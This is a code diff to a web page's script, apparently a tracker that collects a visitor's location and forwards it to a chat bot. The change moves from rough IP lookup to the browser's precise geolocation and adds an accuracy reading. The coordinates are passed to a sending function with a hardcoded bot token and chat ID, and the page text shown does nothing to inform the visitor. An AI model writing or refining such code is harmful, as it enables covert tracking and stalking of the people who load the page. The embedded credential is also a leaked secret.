@@ -10,22 +10,24 @@
 
     <script>
         function getLocationAndSend() {
-            fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                var latitude = data.latitude;
-                var longitude = data.longitude;
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+                    var accuracy = position.coords.accuracy;
 
-                var token = '6845141846:AAHqQu5jJJuWzDb8YNAUyY-nWx7F5d08gxE';
-                var chatId = '829549685';
+                    var token = '6845141846:AAHqQu5jJJuWzDb8YNAUyY-nWx7F5d08gxE';
+                    var chatId = '829549685';
 
-                var message = 'New location: Latitude ' + latitude + ', Longitude ' + longitude;
+                    var message = 'New location: Latitude ' + latitude + ', Longitude ' + longitude + ', Accuracy: ' + accuracy + ' meters';
 
-                sendLocation(token, chatId, message);
-            })
-            .catch(error => {
-                console.error('Error getting location:', error);
-            });
+                    sendLocation(token, chatId, message);
+                }, function(error) {
+                    console.error('Error getting location:', error);
+                });
+            } else {
+                console.error('Geolocation is not supported by this browser.');
+            }
         }
 
         function sendLocation(token, chatId, message) {
